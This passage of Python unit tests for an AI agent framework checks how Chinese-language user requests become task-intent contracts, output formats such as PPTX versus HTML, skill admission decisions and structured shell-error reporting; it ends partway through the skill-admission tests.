payload={'tests': {'test_output_format_contract.py': '"""Explicit output format survives semantic misclassification and general routing."""\nfrom copy import deepcopy\nimport json\nimport io\nimport tempfile\nfrom contextlib import redirect_stdout\nimport unittest\nfrom unittest.mock import patch\n\nfrom dsh_modules.task_intent import validate_intent, extract_task_intent\nfrom dsh_modules.telemetry import TelemetryStats\nfrom dsh_modules.skill_admission import general_route\nfrom dsh_modules.output_format_contract import requested_output_formats\n\n\nclass OutputFormatContractTests(unittest.TestCase):\n    def contract(self, request, formats=None, relation=\'standalone\'):\n        return {\'instruction_relation\': relation, \'task_mode\': \'execute\', \'output_mode\': \'artifact\',\n                \'artifact_types\': formats or [\'.html\'], \'unit_confirmation\': None, \'section_confirmation\': None,\n                \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n                \'requirements\': [{\'id\': \'r\', \'quote\': request}]}\n\n    def test_original_election_ppt_request_cannot_be_downgraded_to_html(self):\n        request = \'帮我生成一个小学生 竞选班干部的ppt，3到4页，主要是自我介绍，个人荣誉，竞选的目标和宣言，或者给你的建议，不要太复杂\'\n        result = validate_intent(self.contract(request), request, [], [], allow_sanitize=True)\n        self.assertEqual(result[\'artifact_types\'], [\'.pptx\'])\n        with patch(\'dsh_modules.skills.get_available_skills\', return_value=[]):\n            route = general_route(request, [], [], result)\n        self.assertIsNone(route.skill_id)\n        self.assertEqual(route.deliverables, [\'.pptx\'])\n\n    def test_explicit_native_formats_override_wrong_semantic_format(self):\n        for request, expected in [\n            (\'生成一份Word文档\', [\'.docx\']), (\'生成Excel文件\', [\'.xlsx\']),\n            (\'生成PDF报告\', [\'.pdf\']), (\'生成金额柱状图的ppt\', [\'.pptx\']),\n            (\'读取输入.xlsx，生成说明.docx\', [\'.docx\']),\n            (\'生成PPT和HTML网页两个文件\', [\'.html\', \'.pptx\']),\n        ]:\n            with self.subTest(request=request):\n                result = validate_intent(self.contract(request), request, [], [])\n                self.assertCountEqual(result[\'artifact_types\'], expected)\n\n    def test_explicit_html_deck_and_followup_switch_are_preserved(self):\n        for request in [\'生成HTML形式的PPT\', \'生成网页PPT\']:\n            self.assertEqual(requested_output_formats(request), [\'.html\'])\n        self.assertEqual(requested_output_formats(\'继续生成\', [\'生成一个ppt\'], \'followup\'), [\'.pptx\'])\n        self.assertEqual(requested_output_formats(\'改成HTML网页\', [\'生成一个ppt\'], \'followup\'), [\'.html\'])\n        self.assertEqual(requested_output_formats(\'随便聊聊\', [\'生成一个ppt\']), [])\n\n    def test_consultation_and_export_negation_do_not_create_artifacts(self):\n        for request in [\'解释如何生成ppt\', \'不要生成PPT，只在聊天中说明\']:\n            contract = self.contract(request)\n            contract.update(task_mode=\'consult\', output_mode=\'conversation\', artifact_types=[])\n            result = validate_intent(deepcopy(contract), request, [], [])\n            self.assertEqual(result[\'artifact_types\'], [])\n\n    def test_followup_chart_promotion_cannot_add_html_to_native_ppt(self):\n        request = \'按部门统计金额生成柱状图的ppt\'\n        response = {\'content\': json.dumps(self.contract(request, relation=\'followup\')), \'finish_reason\': \'stop\'}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=response):\n            result = extract_task_intent(request, [\'按部门统计金额生成ppt\'], \'test\', None, TelemetryStats(), None)\n        self.assertEqual(result[\'artifact_types\'], [\'.pptx\'])\n\n    def test_sent_html_does_not_satisfy_missing_pptx_contract(self):\n        from dsh_modules import agent_loop\n        from dsh_modules.runtime_policy import RuntimePolicy\n        responses = [{\'content\': \'\', \'tool_calls\': [{\'id\': \'send\', \'type\': \'function\',\n            \'function\': {\'name\': \'send_file\', \'arguments\': \'{}\'}}]},\n            {\'content\': \'已生成HTML网页\', \'finish_reason\': \'stop\'}]\n        def dispatch(**kwargs):\n            kwargs[\'outbound_files\'].append(json.dumps({\'filePath\': \'/workspace/slides.html\'}))\n            return True\n        with tempfile.TemporaryDirectory() as workspace, \\\n             patch.object(agent_loop, \'WORKSPACE_DIR\', workspace), \\\n             patch.object(agent_loop, \'call_model_proxy\', side_effect=responses), \\\n             patch.object(agent_loop, \'_dispatch_tool_calls\', side_effect=dispatch), \\\n             patch.object(agent_loop, \'_finalize_agent_text\', return_value=(\'已生成HTML网页\', [])), \\\n             patch.object(agent_loop, \'detect_missing_requested_deliverable\', return_value=\'.pptx\'), \\\n             redirect_stdout(io.StringIO()):\n            result = agent_loop.run_agent_loop([{\'role\': \'system\', \'content\': \'\'},\n                {\'role\': \'user\', \'content\': \'生成PPT\'}], model=\'test\', policy=RuntimePolicy(),\n                max_rounds=1, expected_deliverables=[\'.pptx\'], is_generate_intent=True,\n                user_prompt=\'生成PPT\')\n        self.assertTrue(result.outbound_files)\n        self.assertTrue(any(g[\'guard\'] == \'deliverable_contract\' and g[\'action\'] == \'reject\'\n                            for g in result.telemetry.guard_decisions))\n', 'test_shell_exit_status.py': '"""Pipeline failures must survive tail, while explicitly handled failures remain valid."""\nimport tempfile\nimport unittest\nfrom unittest.mock import patch\n\nfrom dsh_modules.tools import execute_tool\nfrom dsh_modules.tool_result import adapt_tool_output\n\n\nclass ShellExitStatusTests(unittest.TestCase):\n    def test_failed_pipeline_has_structured_error_even_when_tail_succeeds(self):\n        with tempfile.TemporaryDirectory() as workspace, patch(\'dsh_modules.tools.WORKSPACE_DIR\', workspace):\n            result = adapt_tool_output(execute_tool(\'bash\', {\'cmd\': "(echo \'installation failed\'; exit 7) 2>&1 | tail -5"}))\n        self.assertTrue(result.is_error)\n        self.assertEqual(result.error_code, \'shell_command_failed\')\n        self.assertEqual(result.error[\'exit_code\'], 7)\n        self.assertIn(\'退出码 7\', result.error_message)\n        self.assertIn(\'installation failed\', result.error_message)\n\n    def test_successful_pipeline_and_explicit_recovery_still_succeed(self):\n        with tempfile.TemporaryDirectory() as workspace, patch(\'dsh_modules.tools.WORKSPACE_DIR\', workspace):\n            for command in ["printf \'ok\\\\n\' | tail -1", "false | tail -1 || echo handled"]:\n                with self.subTest(command=command):\n                    self.assertTrue(adapt_tool_output(execute_tool(\'bash\', {\'cmd\': command})).is_success)\n\n    def test_markdown_tool_rejecting_html_is_a_structured_failure(self):\n        with tempfile.TemporaryDirectory() as workspace, patch(\'dsh_modules.tools.WORKSPACE_DIR\', workspace):\n            result = adapt_tool_output(execute_tool(\'write_markdown\', {\'file_path\': \'slides.html\', \'content\': \'<html/>\'}))\n        self.assertTrue(result.is_error)\n        self.assertEqual(result.error_code, \'artifact_write_failed\')\n\n    def test_missing_builtin_dependency_reports_environment_repair_not_pip_loop(self):\n        command = \'\'\'printf "ModuleNotFoundError: No module named \'pptx\'\\\\n"; exit 1\'\'\'\n        result = adapt_tool_output(execute_tool(\'bash\', {\'cmd\': command}))\n        self.assertTrue(result.is_error)\n        self.assertIn(\'更新镜像\', result.error_message)\n        self.assertNotIn(\'pip install\', result.error_message)\n', 'test_task_intent.py': '"""Intent is extracted independently of skill defaults and remains source grounded."""\n\nimport json\nimport sys\nimport time\nimport unittest\nfrom pathlib import Path\nfrom unittest.mock import patch\n\nsys.path.insert(0, str(Path(__file__).resolve().parent.parent / \'src\'))\nfrom dsh_modules.task_intent import extract_task_intent\nfrom dsh_modules.telemetry import TelemetryStats\nfrom dsh_modules.semantic_decision import ground_user_quote\n\n\nclass TaskIntentTests(unittest.TestCase):\n    def test_extraction_has_no_candidate_skill_or_default_delivery_context(self):\n        request = \'读取附件，列出各组结果\'\n        def model(messages, **kwargs):\n            payload = json.loads(messages[-1][\'content\'])\n            self.assertTrue(set(payload) <= {\'request\', \'user_history\', \'recent_dialogue\', \'input_count\', \'skill_names\', \'feedback\', \'proposed_contract\'})\n            self.assertFalse(kwargs[\'stream_deltas\'])\n            return {\'finish_reason\': \'stop\', \'content\': json.dumps({\'task_mode\': \'execute\',\n                \'output_mode\': \'conversation\', \'artifact_types\': [], \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n                \'requirements\': [{\'id\': \'r\', \'quote\': request}]})}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', side_effect=model):\n            result = extract_task_intent(request, [], \'selected-model\', None, TelemetryStats(), time.monotonic()+30, input_count=1)\n        self.assertEqual(result[\'output_mode\'], \'conversation\')\n\n    def test_invocation_can_bind_catalog_identity_without_literal_id_in_request(self):\n        request = \'用月度盘点列出结果\'\n        response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\'task_mode\': \'execute\',\n            \'output_mode\': \'conversation\', \'artifact_types\': [],\n            \'skill_invocation\': {\'mode\': \'execute\', \'name\': \'inventory-87\', \'replace_defaults\': False},\n            \'requirements\': [{\'id\': \'r\', \'quote\': request}]})}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=response):\n            result = extract_task_intent(request, [], \'model\', None, TelemetryStats(), time.monotonic()+30,\n                skill_names=[{\'id\': \'inventory-87\', \'name\': \'月度盘点\', \'aliases\': []}])\n        self.assertEqual(result[\'skill_invocation\'][\'name\'], \'inventory-87\')\n        self.assertEqual(result[\'skill_invocation\'][\'mode\'], \'execute\')\n\n    def test_catalog_entry_is_not_itself_a_user_invocation(self):\n        response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\'task_mode\': \'execute\',\n            \'output_mode\': \'conversation\', \'artifact_types\': [],\n            \'skill_invocation\': {\'mode\': \'execute\', \'name\': \'inventory-87\', \'replace_defaults\': False},\n            \'requirements\': [{\'id\': \'r\', \'quote\': \'列出全部记录\'}]})}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=response):\n            with self.assertRaisesRegex(ValueError, \'无法可靠确认\'):\n                extract_task_intent(\'列出全部记录\', [], \'model\', None, TelemetryStats(), time.monotonic()+30,\n                    skill_names=[{\'id\': \'inventory-87\', \'name\': \'月度盘点\', \'aliases\': []}])\n\n    def test_independent_review_corrects_unrequested_physical_delivery(self):\n        request = \'只要表格，无需解读\'\n        initial = {\'task_mode\': \'execute\', \'output_mode\': \'artifact\', \'artifact_types\': [\'xlsx\'],\n            \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [{\'id\': \'r\', \'quote\': request}]}\n        corrected = {**initial, \'output_mode\': \'conversation\', \'artifact_types\': []}\n        replies = [{\'finish_reason\': \'stop\', \'content\': json.dumps(v)} for v in (initial, corrected)]\n        telemetry = TelemetryStats()\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', side_effect=replies) as call:\n            result = extract_task_intent(request, [], \'model\', None, telemetry, time.monotonic()+30)\n        self.assertEqual(call.call_count, 2)\n        self.assertEqual(result[\'output_mode\'], \'conversation\')\n        self.assertEqual(result[\'artifact_types\'], [])\n        self.assertTrue(any(g[\'guard\'] == \'task_intent_review\' and g[\'action\'] == \'revise\' for g in telemetry.guard_decisions))\n\n    def test_quote_normalization_restores_source_span_without_semantic_rewriting(self):\n        self.assertEqual(ground_user_quote(\'按部门编号统计\', [\'按 部门编号 统计\']), \'按 部门编号 统计\')\n        self.assertIsNone(ground_user_quote(\'仅统计已批准\', [\'统计全部记录\']))\n        self.assertIsNone(ground_user_quote(\'abc\', [\'ABC\']))\n\n    def test_invalid_delivery_contract_gets_one_recheck_then_stops(self):\n        response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\'task_mode\': \'execute\',\n            \'output_mode\': \'conversation\', \'artifact_types\': [\'xlsx\'], \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [{\'id\': \'r\', \'quote\': \'列出结果\'}]})}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=response) as call:\n            with self.assertRaises(ValueError):\n                extract_task_intent(\'列出结果\', [], \'model\', None, TelemetryStats(), time.monotonic()+30)\n        self.assertEqual(call.call_count, 2)\n\n    def test_explicit_artifact_extensions_are_normalized_without_format_specific_rules(self):\n        response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\'task_mode\': \'execute\',\n            \'output_mode\': \'artifact\', \'artifact_types\': [\'novel7\'], \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [{\'id\': \'r\', \'quote\': \'导出novel7文件\'}]})}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=response):\n            result = extract_task_intent(\'导出novel7文件\', [], \'model\', None, TelemetryStats(), time.monotonic()+30)\n        self.assertEqual(result[\'artifact_types\'], [\'.novel7\'])\n\n    def test_standalone_relation_blocks_historical_requirement_grounding(self):\n        request = \'统计 各个部门里面 合计金额 超过 500k的部门有哪些\'\n        users = [\'使用部门别有偿统计，只要表格，无需解读\']\n        contaminated_response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\n            \'instruction_relation\': \'standalone\',\n            \'task_mode\': \'execute\',\n            \'output_mode\': \'conversation\',\n            \'artifact_types\': [],\n            \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [\n                {\'id\': \'r1\', \'quote\': request},\n                {\'id\': \'r2\', \'quote\': \'只要表格，无需解读\'}\n            ]\n        })}\n        clean_response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\n            \'instruction_relation\': \'standalone\',\n            \'task_mode\': \'execute\',\n            \'output_mode\': \'conversation\',\n            \'artifact_types\': [],\n            \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [\n                {\'id\': \'r1\', \'quote\': request}\n            ]\n        })}\n        # First attempt returns contaminated_response which fails validate_intent, second returns clean_response\n        replies = [contaminated_response, clean_response, clean_response]\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', side_effect=replies):\n            result = extract_task_intent(request, users, \'model\', None, TelemetryStats(), time.monotonic()+30)\n        self.assertEqual(len(result[\'requirements\']), 1)\n        self.assertEqual(result[\'requirements\'][0][\'quote\'], request)\n        self.assertEqual(result[\'instruction_relation\'], \'standalone\')\n\n    def test_standalone_relation_normalizes_unrequested_artifact_to_conversation(self):\n        request = \'统计 各个部门里面 合计金额 超过 500k的部门有哪些\'\n        artifact_response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\n            \'instruction_relation\': \'standalone\',\n            \'task_mode\': \'execute\',\n            \'output_mode\': \'artifact\',\n            \'artifact_types\': [\'xlsx\'],\n            \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [{\'id\': \'r1\', \'quote\': request}]\n        })}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=artifact_response):\n            result = extract_task_intent(request, [], \'model\', None, TelemetryStats(), time.monotonic()+30)\n        self.assertEqual(result[\'output_mode\'], \'conversation\')\n        self.assertEqual(result[\'artifact_types\'], [])\n\n    def test_standalone_relation_preserves_explicit_export_request(self):\n        request = \'导出各个部门统计为excel文件\'\n        artifact_response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\n            \'instruction_relation\': \'standalone\',\n            \'task_mode\': \'execute\',\n            \'output_mode\': \'artifact\',\n            \'artifact_types\': [\'xlsx\'],\n            \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [{\'id\': \'r1\', \'quote\': request}]\n        })}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=artifact_response):\n            result = extract_task_intent(request, [], \'model\', None, TelemetryStats(), time.monotonic()+30)\n        self.assertEqual(result[\'output_mode\'], \'artifact\')\n        self.assertEqual(result[\'artifact_types\'], [\'.xlsx\'])\n\n    def test_followup_relation_allows_historical_requirement_grounding(self):\n        request = \'再筛选出大于500的\'\n        users = [\'统计各个部门合计金额\']\n        followup_response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\n            \'instruction_relation\': \'followup\',\n            \'task_mode\': \'execute\',\n            \'output_mode\': \'conversation\',\n            \'artifact_types\': [],\n            \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [\n                {\'id\': \'r1\', \'quote\': request},\n                {\'id\': \'r2\', \'quote\': \'统计各个部门合计金额\'}\n            ]\n        })}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=followup_response):\n            result = extract_task_intent(request, users, \'model\', None, TelemetryStats(), time.monotonic()+30)\n        self.assertEqual(result[\'instruction_relation\'], \'followup\')\n        self.assertEqual(len(result[\'requirements\']), 2)\n\n    def test_followup_parameter_fulfillment_normalizes_to_execute(self):\n        request = \'有偿的金额\'\n        users = [\'统计各个部门金额\']\n        consult_response = {\'finish_reason\': \'stop\', \'content\': json.dumps({\n            \'instruction_relation\': \'followup\',\n            \'task_mode\': \'consult\',\n            \'output_mode\': \'conversation\',\n            \'artifact_types\': [],\n            \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [{\'id\': \'1\', \'quote\': request}]\n        })}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=consult_response):\n            result = extract_task_intent(request, users, \'model\', None, TelemetryStats(), time.monotonic()+30)\n        self.assertEqual(result[\'task_mode\'], \'execute\')\n\n    def test_condition_replacement_heals_standalone_to_followup_and_preserves_chart_artifact(self):\n        users = [\'按部门统计 金额的合计，不包含（WBS编号）中ex，sy，sp，ip，ib，sz开头的数据，生成柱状图\']\n        request = \'按部门统计 金额的合计，只包含（WBS编号）中ex，sy，sp，ip，ib，sz开头的数据\'\n        # Model initially misclassifies as standalone but quotes the historical chart requirement\n        model_reply = {\'finish_reason\': \'stop\', \'content\': json.dumps({\n            \'instruction_relation\': \'standalone\',\n            \'task_mode\': \'execute\',\n            \'output_mode\': \'artifact\',\n            \'artifact_types\': [\'html\'],\n            \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [\n                {\'id\': \'r1\', \'quote\': \'按部门统计 金额的合计，只包含(WBS编号)中ex,sy,sp,ip,ib,sz开头的数据\'},\n                {\'id\': \'r2\', \'quote\': \'生成柱状图\'}\n            ]\n        })}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=model_reply):\n            result = extract_task_intent(request, users, \'model\', None, TelemetryStats(), time.monotonic()+30)\n        self.assertEqual(result[\'instruction_relation\'], \'followup\')\n        self.assertEqual(result[\'output_mode\'], \'artifact\')\n        self.assertIn(\'.html\', result[\'artifact_types\'])\n        self.assertEqual(len(result[\'requirements\']), 2)\n\n    def test_clean_dialogue_content_strips_html_and_code_blocks(self):\n        from dsh_modules.task_intent import clean_dialogue_content\n        assistant_raw = (\n            "✨ 交互式页面已生成完毕！\\n\\n"\n            "输出文件：/workspace/index.html\\n"\n            "```html\\n<!DOCTYPE html><html><head><style>body { color: red; }</style></head><body><h1>Chart</h1></body></html>\\n```\\n"\n            "<div>操作提示：请查看看板</div>"\n        )\n        cleaned = clean_dialogue_content(\'assistant\', assistant_raw)\n        self.assertNotIn(\'```\', cleaned)\n        self.assertNotIn(\'<!DOCTYPE\', cleaned)\n        self.assertNotIn(\'<style>\', cleaned)\n        self.assertIn(\'交互式页面已生成完毕\', cleaned)\n        self.assertIn(\'/workspace/index.html\', cleaned)\n        self.assertIn(\'操作提示：请查看看板\', cleaned)\n\n    def test_unrelated_task_does_not_inherit_chart(self):\n        users = [\'按部门统计 金额的合计，不包含...生成柱状图\']\n        request = \'帮我写一封感谢信\'\n        model_reply = {\'finish_reason\': \'stop\', \'content\': json.dumps({\n            \'instruction_relation\': \'standalone\',\n            \'task_mode\': \'execute\',\n            \'output_mode\': \'conversation\',\n            \'artifact_types\': [],\n            \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n            \'requirements\': [{\'id\': \'r1\', \'quote\': request}]\n        })}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', return_value=model_reply):\n            result = extract_task_intent(request, users, \'model\', None, TelemetryStats(), time.monotonic()+30)\n        self.assertEqual(result[\'instruction_relation\'], \'standalone\')\n        self.assertEqual(result[\'output_mode\'], \'conversation\')\n        self.assertEqual(result[\'artifact_types\'], [])\n\n\nif __name__ == \'__main__\': unittest.main()\n', 'test_skill_admission.py': '"""Shared admission behavior across unknown skills, formats and execution engines."""\n\nimport io\nimport json\nimport sys\nimport time\nimport unittest\nfrom contextlib import redirect_stdout\nfrom pathlib import Path\nfrom unittest.mock import patch\n\nsys.path.insert(0, str(Path(__file__).resolve().parent.parent / \'src\'))\nfrom dsh_modules.skill_admission import admit_skill, validate_decision, AdmissionClarification\nfrom dsh_modules.skill_router import SkillRouter\nfrom dsh_modules.telemetry import TelemetryStats\nfrom dsh_modules.spreadsheet_analysis_evidence import requires_spreadsheet_analysis\n\n\nclass SkillAdmissionTests(unittest.TestCase):\n    def setUp(self):\n        self.skills = [\n            {\'id\': \'alpha-policy\', \'name\': \'限定范围汇总\', \'description\': \'按已确认范围过滤后汇总金额\', \'type\': \'custom\',\n             \'execution_mode\': \'verified_workflow\', \'requires_execution\': True},\n            {\'id\': \'beta-method\', \'name\': \'通用明细分析\', \'description\': \'按当前要求分析明细，不附加业务过滤\', \'type\': \'certified\'},\n            {\'id\': \'gamma-writing\', \'name\': \'叙述整理\', \'description\': \'整理段落，不执行数值统计\', \'type\': \'custom\'},\n        ]\n        self.request = \'统计全部部门金额，仅输出表格\'\n        self.telemetry = TelemetryStats()\n\n    def decision(self, action=\'use\', skill=\'alpha-policy\', defaults=False, request=None):\n        return {\'action\': action, \'skill_id\': skill, \'use_default_rules\': defaults,\n                \'rule_basis\': request or self.request if defaults else \'\',\n                \'output_mode\': \'conversation\', \'artifact_types\': [], \'skill_invocation\': {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False},\n                \'task_mode\': \'execute\',\n                \'requirements\': [{\'id\': \'goal\', \'quote\': request or self.request}],\n                \'reason\': \'applicable\' if action == \'use\' else \'scope_mismatch\', \'question\': \'\'}\n\n    def invoke(self, responder, prompt=None, files=None):\n        prompt = prompt or self.request; bodies = []; decisions = []\n        with redirect_stdout(io.StringIO()):\n            provisional = SkillRouter.route(prompt, available_skills=self.skills, selection={\'skill_id\': \'alpha-policy\'},\n                                             load_skill_context=False)\n        def body(identifier):\n            bodies.append(identifier)\n            return f\'技能 {identifier} 的真实方法与适用范围\'\n        def model(messages, **kwargs):\n            payload = json.loads(messages[-1][\'content\'])\n            if kwargs[\'tools\'][0][\'function\'][\'name\'] == \'submit_task_intent\':\n                result = {\'task_mode\': getattr(self, \'intent_mode\', \'execute\'), \'output_mode\': \'conversation\',\n                          \'artifact_types\': [], \'skill_invocation\': getattr(self, \'intent_invocation\', {\'mode\': \'none\', \'name\': \'\', \'replace_defaults\': False}), \'requirements\': [{\'id\': \'goal\', \'quote\': prompt}]}\n            else:\n                decisions.append(payload)\n                result = responder(payload, len(decisions))\n                result = {k: v for k, v in result.items() if k not in {\'task_mode\',\'output_mode\',\'artifact_types\',\'skill_invocation\',\'requirements\'}}\n            return {\'finish_reason\': \'tool_calls\', \'content\': \'\', \'tool_calls\': [{\'type\': \'function\',\n                \'function\': {\'name\': kwargs[\'tools\'][0][\'function\'][\'name\'], \'arguments\': json.dumps(result)}}]}\n        with patch(\'dsh_modules.semantic_decision.call_model_proxy\', side_effect=model), redirect_stdout(io.StringIO()):\n            route = admit_skill(prompt, [], files or [], provisional, \'configured-model\', None, self.telemetry,\n                                time.monotonic()+60, available_skills=self.skills, read_body=body)\n        return route, bodies, decisions\n\n    def test_unknown_skill_can_be_admitted_without_new_code_or_name_branch(self):\n        self.skills.append({\'id\': \'newly-installed-47\', \'name\': \'新方法\', \'description\': \'分析用户要求的部门明细\', \'type\': \'custom\'})\n        route, bodies, calls = self.invoke(lambda p, n: self.decision(skill=\'newly-installed-47\'))\n        self.assertEqual(route.skill_id, \'newly-installed-47\')\n        self.assertEqual(bodies, [\'alpha-policy\', \'newly-installed-47\']); self.assertEqual(len(calls), 2)\n        self.assertEqual(route.skill_context, \'\')\n        self.assertEqual(route.admission[\'skill_id\'], \'newly-installed-47\')\n\n    def test_wrong_match_is_replaced_and_new_body_is_reviewed_before_execution(self):\n        route, bodies, calls = self.invoke(lambda p, n: self.decision(skill=\'beta-method\'))\n        self.assertEqual(route.skill_id, \'beta-method\')\n        self.assertNotIn(\'alpha-policy\', route.skill_context)\n        self.assertIn(\'beta-method\', calls[1][\'inspected_skills\'])\n        self.assertFalse(route.requires_execution, \'rejected custom engine contract must not survive\')\n\n    def test_whole_skill_invocation_cannot_silently_drop_its_rules(self):\n        request = \'使用限定范围汇总，追加结果排序\'\n        self.intent_invocation = {\'mode\': \'execute\', \'name\': \'限定范围汇总\', \'replace_defaults\': False}\n        def respond(payload, attempt):\n            if attempt == 2:\n                self.assertIn(\'error\', payload[\'feedback\'])\n            return self.decision(defaults=attempt == 2, request=request)\n        route, _, calls = self.invoke(respond, prompt=request)\n        self.assertEqual(len(calls), 2)\n        self.assertTrue(route.admission[\'use_default_rules\'])\n\n    def test_explicit_scope_override_can_use_method_without_default_rules(self):\n        request = \'使用限定范围汇总的方法，但取消其过滤规则\'\n        self.intent_invocation = {\'mode\': \'execute\', \'name\': \'限定范围汇总\', \'replace_defaults\': True}\n        route, _, calls = self.invoke(lambda p, n: self.decision(request=request), prompt=request)\n        self.assertEqual(len(calls), 1)\n        self.assertFalse(route.admission[\'use_default_rules\'])\n\n    def test_defaults_cannot_be_granted_without_whole_skill_call(self):\n        with self.assertRaises(ValueError):\n            self.invoke(lambda p, n: self.decision(defaults=True))\n\n    def test_reference_only_does_not_inherit_business_instructions(self):\n        route, _, _ = self.invoke(lambda p, n: self.decision())\n        self.assertEqual(route.skill_context, \'\')\n        self.assertFalse(route.admission[\'use_default_rules\'])\n\n    def test_mentioning_a_skill_name_does_not_force_default_rules(self):\n        request = \'不要使用alpha-policy的过滤规则，只参考方法统计全部数据\'\n        route, _, _ = self.invoke(lambda p, n: self.decision(request=request), prompt=request)\n        self.assertFalse(route.admission[\'use_default_rules\']); self.assertEqual(route.skill_context, \'\')\n\n    def test_general_replanning_clears_wrong_skill_and_keeps_native_input_evidence_gate(self):\n        route, _, _ = self.invoke(lambda p, n: self.decision(action=\'general\', skill=None), files=[\'fresh.xlsx\'])\n        self.assertIsNone(route.skill_id); self.assertEqual(route.skill_context, \'\')\n        self.assertEqual(route.deliverables, []); self.assertFalse(route.requires_execution)\n        self.assertTrue(requires_spreadsheet_analysis(self.request, route))\n        from dsh_modules.runner import select_active_tools\n        tools = select_active_tools(self.request, route, False, False)\n        names = {t[\'function\'][\'name\'] for t in tools}\n        self.assertIn(\'aggregate_spreadsheet\', names)\n        self.assertNotIn(\'bash\', names)\n\n    def test_same_admission_contract_works_for_writing_without_spreadsheets(self):\n        request = \'整理这段说明为三个简短段落\'\n        route, _, _ = self.invoke(lambda p, n: self.decision(skill=\'gamma-writing\', request=request), prompt=request)\n        self.assertEqual(route.skill_id, \'gamma-writing\'); self.assertEqual(route.skill_context, \'\')\n        self.assertEqual(route.source_formats, [])\n\n    def test_format_and_slash_are_candidates_not_bypasses(self):\n        request = \'/alpha-policy 解释其用途，暂不执行\'\n        route, _, calls = self.invoke(lambda p, n: self.decision(action=\'general\', skill=None, request=request), prompt=request, files=[\'source.pdf\'])\n        self.assertIsNone(route.skill_id); self.assertEqual(len(calls), 1)\n\n    def test_consulting_a_skill_never_starts_its_specialized_executor(self):\n        from dsh_modules.personal_skill_workflow import try_run_personal_workflow\n        self.intent_mode = \'consult\'\n        request = \'解释alpha-policy的用途，不执行\'\n        route, _, _ = self.invoke(lambda p, n: {**self.decision(request=request), \'task_mode\': \'consult\'}, prompt=request)\n        self.assertFalse(route.requires_execution)\n        self.assertFalse(try_run_personal_workflow(route, [], request, None, [], time.time(), None))\n\n    def test_clarify_stops_before_skill_execution(self):\n        with self.assertRaisesRegex(AdmissionClarification, \'哪个期间\'):\n            self.invoke(lambda p, n: {**self.decision(action=\'clarify\', skill=None), \'question\': \'需要统计哪个期间？\'})\n\n    def test_clarify_forbids_output_format_inquiry(self):\n        with self.assertRaisesRegex(ValueError, \'交付格式已由任务契约锁定\'):\n            validate_decision(\n                {**self.decision(action=\'clarify\', skill=None),\n                 \'question\': \'请问您希望将统计结果输出为什么格式？例如：1. 纯文本列表；2. 汇总表格图片；3. 生成新的 Excel 报表。\'},\n                {s[\'id\'] for s in self.skills},\n                [self.request]\n            )\n\n    def test_schema_or_quote_error_gets_one_recheck_without_execution(self):\n        def responder(p, n):\n            if n == 1:\n                return {**self.decision(defaults=True), \'rule_basis\': \'伪造的用户口径\'}\n            self.assertIn(\'error\', p[\'feedback\'])\n            return self.decision()\n        route, _, calls = self.invoke(responder)\n        self.assertEqual(len(calls), 2); self.assertFalse(route.admission[\'use_default_rules\'])\n\n    def test_unreviewed_second_alternative_never_executes(self):\n        with self.assertRaisesRegex(ValueError, \'经复核仍未通过\'):\n            self.invoke(lambda p, n: self.decision(skill=\'beta-method\' if n == 1 else \'gamma-writing\'))\n\n    def test_unknown_skill_forged_defaults_and_invalid_quotes_fail_closed(self):\n        for value in [self.decision(skill=\'not-installed\'),\n                      {**self.decision(defaults=True), \'rule_basis\': \'不存在的授权\'},\n                      {**self.decision(action=\'general\', skill=None), \'use_default_rules\': True}]:\n            with self.assertRaises(ValueError): validate_decision(value, {s[\'id\'] for s in self.skills}, [self.request])\n\n    def test_provisional_discovery_does_not_load_skill_into_execution_prompt(self):\n        with patch(\'dsh_modules.skill_router.read_skill\') as read, redirect_stdout(io.StringIO()):\n            route = SkillRouter.route(\'按范围汇总金额\', available_skills=self.skills, files=[\'data.xlsx\'],\n                                      selection={\'skill_id\': \'alpha-policy\'}, load_skill_context=False)\n        self.assertIsNotNone(route.skill_id); self.assertEqual(route.skill_context, \'\'); read.assert_not_called()\n\n    